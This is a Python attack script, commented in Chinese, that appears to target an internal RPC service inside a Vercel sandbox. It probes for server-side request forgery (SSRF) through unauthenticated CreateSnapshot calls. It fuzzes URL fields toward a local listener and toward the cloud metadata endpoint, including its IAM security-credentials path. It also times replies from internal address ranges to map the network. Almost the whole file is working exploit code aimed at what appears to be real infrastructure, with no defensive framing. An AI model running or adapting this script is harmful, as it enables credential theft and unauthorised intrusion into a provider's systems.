# -*- coding: utf-8 -*-
"""celld3_snap_ssrf: 正确路径版 CreateSnapshot base_url SSRF 真调测试 (V23/V28 复用)
通道: 127.0.0.1:23456 + connectrpc HTTP/1.1 JSON (e150 V22 确认路径格式)
路径: /vercel.hive.cell.api.<api>.v1.<Service>/<Method>  字段 snake_case
1) 路径活性确认: DrivesService/CreateSnapshot (400 drive_id required = ALIVE)
2) UsageService/GetResourceUsage 无认证 200 复验
3) CreateSnapshot + drive_id + base_url 变体 -> 本地观测(18080)/IMDS/内网 oracle
输出落盘 + 哨兵 CELD3_DONE"""
import socket, time, threading, os, sys, http.server

OUT = '/vercel/sandbox/celd3.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


OBSERVED = []
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        OBSERVED.append(('GET', self.path))
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
    def do_POST(self):
        ln = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(ln) if ln else b''
        OBSERVED.append(('POST', self.path, body[:100]))
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
    def log_message(self, *a):
        pass

try:
    srv = http.server.HTTPServer(('127.0.0.1', 18080), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log('observe server 18080 up')
except Exception as e:
    log('observe FAIL %s' % e)


def rpc(port, path, body='{}', t=6):
    """connectrpc HTTP/1.1 JSON 调用"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        req = ('POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, port, len(body)))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:700].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


DRIVES = '/vercel.hive.cell.api.drives.v1.DrivesService'
CONT = '/vercel.hive.cell.api.containers.v1.ContainersService'
USAGE = '/vercel.hive.cell.api.usage.v1.UsageService'

log('=== PHASE0 路径活性 ===')
for path, body in [(DRIVES + '/CreateSnapshot', '{}'),
                   (DRIVES + '/CreateSnapshot', '{"drive_id":"aa"}'),
                   (CONT + '/Create', '{}'),
                   (USAGE + '/GetResourceUsage', '{}')]:
    st, bd = rpc(23456, path, body)
    log('%s %s -> %s | %s' % (path.split('/')[-1], body[:40], st, bd[:200].replace('\n', ' ')))
    time.sleep(0.8)

log('=== PHASE1 drive_id 格式 oracle ===')
for dv in ['aa', 'a' * 32, 'hvcp_' + 'a' * 27, 'ctr_' + 'a' * 29, '0123456789abcdef' * 2]:
    st, bd = rpc(23456, DRIVES + '/CreateSnapshot', '{"drive_id":"%s"}' % dv)
    log('drive_id=%s -> %s | %s' % (dv[:24], st, bd[:250].replace('\n', ' ')))
    time.sleep(0.8)

log('=== PHASE2 base_url 字段变体 -> 本地观测 ===')
DID = 'a' * 32
for i, fld in enumerate(['base_url', 'baseUrl', 'base', 'url', 'upload_url', 'uploadUrl',
                         'target', 'destination', 'snapshot_url', 'snapshotUrl', 'bucket']):
    body = '{"drive_id":"%s","%s":"http://127.0.0.1:18080/probe/%d/%s"}' % (DID, fld, i, fld)
    st, bd = rpc(23456, DRIVES + '/CreateSnapshot', body, t=8)
    log('fld %-14s -> %s | %s | obs=%d' % (fld, st, bd[:200].replace('\n', ' '), len(OBSERVED)))
    time.sleep(1.0)

log('=== PHASE3 IMDS ===')
for fld in ['base_url', 'baseUrl']:
    for url in ['http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/']:
        body = '{"drive_id":"%s","%s":"%s"}' % (DID, fld, url)
        t0 = time.time()
        st, bd = rpc(23456, DRIVES + '/CreateSnapshot', body, t=10)
        log('IMDS %s -> %s (%.1fs) | %s' % (url[:60], st, time.time() - t0, bd[:300].replace('\n', ' ')))
        time.sleep(1.0)

log('=== PHASE4 内网 oracle ===')
for url in ['http://10.0.0.1/', 'http://172.16.0.1/', 'http://192.168.0.1/',
            'http://100.64.0.1/', 'http://8.8.8.8/', 'http://127.0.0.1:18080/local']:
    body = '{"drive_id":"%s","base_url":"%s"}' % (DID, url)
    t0 = time.time()
    st, bd = rpc(23456, DRIVES + '/CreateSnapshot', body, t=6)
    log('net %-30s -> %s (%.1fs) | %s' % (url, st, time.time() - t0, bd[:150].replace('\n', ' ')))
    time.sleep(0.8)

log('=== PHASE5 obs dump ===')
if OBSERVED:
    for o in OBSERVED:
        log('OBS %s %s' % (o[0], o[1]))
else:
    log('OBS none')

log('CELD3_DONE')
f.close()
